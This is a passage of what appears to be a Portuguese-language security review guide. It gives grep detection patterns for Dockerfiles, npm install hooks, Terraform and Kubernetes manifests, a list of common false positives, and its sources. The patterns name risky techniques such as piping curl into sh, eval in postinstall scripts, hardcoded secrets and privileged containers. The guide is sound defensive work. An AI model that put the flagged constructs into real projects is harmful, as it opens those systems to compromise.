grep -nE 'curl.*\|.*sh|--no-check-certificate|--insecure|-k ' Dockerfile
grep -c '^USER ' Dockerfile                                   # 0 = roda como root
grep -nE 'chmod (777|-R 777)' Dockerfile
```

**`package.json` / lockfile**

- `"postinstall"`, `"preinstall"`, `"prepare"` com `curl`, `node -e`, `eval`, path absoluto ou URL.
- Diff de lockfile onde `resolved` aponta para host que não é o registro esperado.
- Dependência nova em PR que também mexe em workflow ou Dockerfile (combinação suspeita).
- `"dependencies"` contendo `git+ssh://` ou tarball por URL sem `integrity`.

**`*.tf`**

```bash
grep -rn '0\.0\.0\.0/0' --include='*.tf' .
grep -rnE '"(Action|Resource)"\s*[:=]\s*"\*"|actions\s*=\s*\["\*"\]' --include='*.tf' .
grep -rn 'iam:PassRole' --include='*.tf' .
grep -rniE '(password|secret|token|api_key)\s*=\s*"' --include='*.tf' --include='*.tfvars' .
grep -rn 'acl *= *"public-read"\|block_public_acls *= *false' --include='*.tf' .
git ls-files | grep -E 'terraform\.tfstate|\.tfvars$'          # nunca deveria estar versionado
grep -rn 'encrypt' --include='*.tf' . | grep -i backend
```

**Manifests Kubernetes**

```bash
grep -rn 'privileged: true\|hostNetwork: true\|hostPID: true\|hostIPC: true' k8s/
grep -rn 'hostPath:' -A2 k8s/
grep -rn 'image: .*:latest\|image: [^@]*$' k8s/                # sem digest
grep -rLn 'runAsNonRoot' k8s/*.yaml
grep -rn 'automountServiceAccountToken' k8s/ || echo 'ausente: default é true'
grep -rn 'kind: ClusterRoleBinding' -A8 k8s/ | grep 'cluster-admin'
grep -rn 'kind: Secret' -A5 k8s/ | grep 'data:'                # segredo em claro no repositório
```

## Falsos positivos comuns

- **`pull_request_target` sem checkout do PR.** É o uso correto e seguro do gatilho: labeler,
  welcome bot, atualização de projeto. Só é bug quando executa código do head do PR. Verifique
  antes de reportar.
- **`${{ github.repository }}`, `github.sha`, `github.run_id`, `github.workflow`, `github.actor`,
  `github.ref_name` em branch protegida** dentro de `run:`. Não são controlados pelo atacante
  (username do GitHub tem charset restrito; `sha` é hex). Só `github.event.*` e `github.head_ref`
  são o problema. Reportar todos gera ruído e queima a credibilidade do achado.
- **`npm audit` high/critical em `devDependencies`.** ReDoS num plugin de lint, prototype pollution
  num pacote de build — não há entrada de atacante nem processo exposto. Rode `--omit=dev` antes de
  levantar a mão.
- **CVE em pacote da imagem base que o container nunca executa.** `perl-base` numa imagem que roda
  um único processo Node. Sem fix disponível, sem alcançabilidade. Documente com VEX
  (`vulnerability_not_in_execute_path`), não abra ticket de correção.
- **Container rodando como root em stage de build de multi-stage.** O que importa é o `USER` da
  imagem final. Idem para container efêmero de job de CI sem acesso a rede nem segredo.
- **`hostNetwork: true` em DaemonSet de CNI, kube-proxy, agente de observabilidade ou ingress
  controller.** É o desenho do componente, não um erro. O mesmo vale para `hostPath` num CSI driver.
- **Action não pinada quando é `actions/checkout@v5` ou `actions/setup-node@v5`.** São mantidas pelo
  próprio GitHub, no mesmo tenant que já executa o seu workflow. Pinar continua sendo a
  recomendação, mas a severidade é baixa — não é o mesmo risco de uma action de conta pessoal com um
  mantenedor.
- **Range `^` em `package.json` com lockfile commitado e `npm ci` em CI.** O lockfile já congela.
  Reportar como "versão não pinada" é falso positivo.
- **`resolved` apontando para `registry.npmjs.org` num monorepo sem pacote privado.** Só é
  dependency confusion se existir um pacote interno de mesmo nome.
- **Segredo em variável de ambiente do processo** (em vez de arquivo montado). É uma preferência de
  hardening (variáveis vazam em crash dump e em `/proc/<pid>/environ`), não uma vulnerabilidade por
  si só.
- **`latest` em `docker-compose.yml` de desenvolvimento local** ou em `devcontainer.json`. O
  problema é em produção.
- **`terraform sensitive = true` presente.** Não conclua "resolvido": o valor continua em claro no
  state. E o inverso: a ausência de `sensitive = true` não é o achado — o achado é o state
  desprotegido.
- **Endpoint de CI sem autenticação atrás de mTLS ou de rede privada validada.** Confirme a
  fronteira de rede antes de reportar como exposto.

## Fontes

- OWASP Top 10:2025 — [A03: Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/) · [Introdução e lista completa](https://owasp.org/Top10/2025/0x00_2025-Introduction/)
- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [SLSA v1.2 — Security Levels](https://slsa.dev/spec/v1.1/levels) · [slsa.dev](https://slsa.dev/)
- [Sigstore — cosign verify](https://docs.sigstore.dev/cosign/verifying/verify/) · [in-toto attestation](https://github.com/in-toto/attestation)
- GitHub Actions — [Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) · [Artifact attestations](https://docs.github.com/en/actions/how-tos/secure-your-work/use-artifact-attestations/use-artifact-attestations) · [OIDC com AWS](https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments/oidc-in-aws)
- npm — [Generating provenance statements](https://docs.npmjs.com/generating-provenance-statements) · [Trusted publishers](https://docs.npmjs.com/trusted-publishers) · [Plano de segurança do npm (GitHub, 22/set/2025)](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/)
- pnpm — [Dependency resolution settings (`minimumReleaseAge`)](https://pnpm.io/settings/dependency-resolution) · Yarn — [`.yarnrc.yml` (`npmMinimalAgeGate`, `enableScripts`)](https://yarnpkg.com/configuration/yarnrc)
- Kubernetes — [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- Terraform — [Sensitive data in state](https://developer.hashicorp.com/terraform/language/state/sensitive-data)
- NIST — [SP 800-218: Secure Software Development Framework (SSDF)](https://csrc.nist.gov/pubs/sp/800/218/final) · CISA — [Known Exploited Vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) · FIRST — [EPSS](https://www.first.org/epss/)
- Incidentes: [CVE-2024-3094 (xz/liblzma)](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) · [Codecov Security Update](https://about.codecov.io/security-update/) · [PyTorch `torchtriton`](https://pytorch.org/blog/compromised-nightly-dependency/) · [Dependency Confusion — Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) · [Shai-Hulud (Wiz)](https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack) · [Compromisso de `chalk`/`debug` (Aikido)](https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised) · [CISA AA20-352A (SolarWinds)](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a)
- [CycloneDX](https://cyclonedx.org/) · [SPDX](https://spdx.dev/) · [Dependency-Track](https://dependencytrack.org/) · [OpenVEX](https://github.com/openvex)
